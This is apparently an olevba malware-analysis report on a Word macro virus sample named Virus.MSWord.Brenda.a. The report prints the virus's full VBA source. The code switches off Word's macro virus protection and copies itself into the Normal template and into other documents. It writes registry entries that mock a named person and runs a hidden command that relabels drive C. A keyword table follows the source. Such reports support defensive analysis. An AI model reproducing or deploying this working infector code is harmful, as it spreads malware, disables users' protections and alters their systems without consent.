olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Brenda.a-feee841bb4a71e7f6653460004e1b7ea96902a10
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Brenda.a-feee841bb4a71e7f6653460004e1b7ea96902a10 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

bSavedState = ActiveDocument.Saved

Application.EnableCancelKey = Not True
Options.VirusProtection = Not True
Options.SaveNormalPrompt = Not True
Options.ConfirmConversions = Not True

sLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"

System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Little Miss Nick"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "") = "C:\\WINDOWS\\SYSTEM\\shell32.dll,10"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Display Name") = "Asexual"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Email Address") = "nick@virusbtn.com"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "Name") = "Nick FitzGerald the queen"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "SN") = "415F7097"
System.PrivateProfileString("win.ini", "WinZip", "Name") = "Nick FitzGerald the queen"
System.PrivateProfileString("win.ini", "WinZip", "Name") = "415F7097"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts", "name") = "NicKKK"

Shell "label c: n0nuts", vbHide

ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

ActiveDocument.Saved = bSavedState

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

